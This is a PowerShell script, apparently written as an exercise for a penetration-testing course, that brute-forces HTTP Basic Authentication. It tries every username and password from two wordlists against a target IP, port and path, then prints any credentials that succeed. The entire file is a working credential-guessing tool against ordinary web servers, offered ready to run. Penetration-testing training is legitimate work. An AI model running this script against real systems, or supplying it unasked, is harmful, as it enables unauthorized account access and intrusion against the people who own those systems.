﻿
function Brute-Force-Basic-Authentication{

<#

.SYNOPSIS
PowerShell script to brute force basic authentication.

.DESCRIPTION
The script is designed to Try list of usernames and list of passwords in Basic Authentication.

.PARAMETER IP
The IP or IP address parameter are used to connect to when using the -IP switch.

.PARAMETER Port
Default port is 80.

.PARAMETER Protocol
The protocolto be used.

.PARAMETER UserList
List of Usernames to use in Brute forcing.

.PARAMETER PasswordList
List of Passwords to use in Brute forcing.

.PARAMETER StopOnSuccess
Use -StopOnSuccess switch to stop the brute forcing on the first success attempt.

.PARAMETER Path
The file on the target server that the bruteforce attempts to authenticat against, ex: http:\\127.0.0.1:80\admin

.EXAMPLE
PS > Brute-Force-Basic-Authentication -IP 127.0.0.1 -UserList \wordlist\usernames.txt -PasswordList \wordlist\passwords.txt -Port 80 

.LINK
GITHUB LINK
BLOGSPOT LINK

.NOTES
This script was created for completing the requirements of the SecurityTube PowerShell for Penetration Testers (PFPT)
Student ID: PSP-3223

Credits for :https://github.com/ahhh/PSSE/blob/master/Brute-Basic-Auth.ps1

#>

  [CmdletBinding()] Param(
  
    [Parameter(Mandatory = $true, ValueFromPipeline=$true)][String] $IP,
    
    [Parameter(Mandatory = $true) ][String]$UserList,
    
    [Parameter(Mandatory = $true) ][String]$PasswordList,
    
    [Parameter(Mandatory = $false)][String]$Port = "80",
    
    [Parameter(Mandatory = $false)][String]$StopOnSuccess = "True",
    
    [Parameter(Mandatory = $false)][String]$Protocol = "http",

    [Parameter(Mandatory = $false)][String]$Path = ""
  
  )
  
  #prepare the full URL and usernames with passwords
  $Full_URL = $Protocol + "://" + $IP + ":" + $Port + "/" + $Path
  $Usernames = Get-Content $UserList
  $Passwords = Get-Content $PasswordList
  
  #nested loops, first one go through usernames and the second try all password with selected username
  :Usernames_loop foreach ($Username in $Usernames)
  {
    # Loops trying each passwords in the list
    foreach ($Password in $Passwords)
    {
      # Start a new web client
      $WebClient = New-Object Net.WebClient

      # Prepare Basic Authentication Credentials for web client
      $SecurePassword = ConvertTo-SecureString -AsPlainText -String $Password -Force
      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username, $SecurePassword
      $WebClient.Credentials = $Credential
      Try
      {
        # Prints the targeted website to brute force
        $Full_URL

        # Prints the credentials being tested
        $message = "Checking $Username : $Password"
        $message
        $content = $webClient.DownloadString($Full_URL)

        # Continues on to print succesfull credentials
        $success = $true
       
        #$success
        if ($success -eq $true)
        {
          # Prints succesfull auths to highlight legit creds
          $message = "[*]Match found! $Username : $Password"
          $message
          $content
          if ($StopOnSuccess)
          {
            break Usernames_loop
          }
        }
      }
      Catch
      {
        # Print any error we receive
        $success = $false
        $message = $error[0].ToString()
        $message
      }
    }
  }
}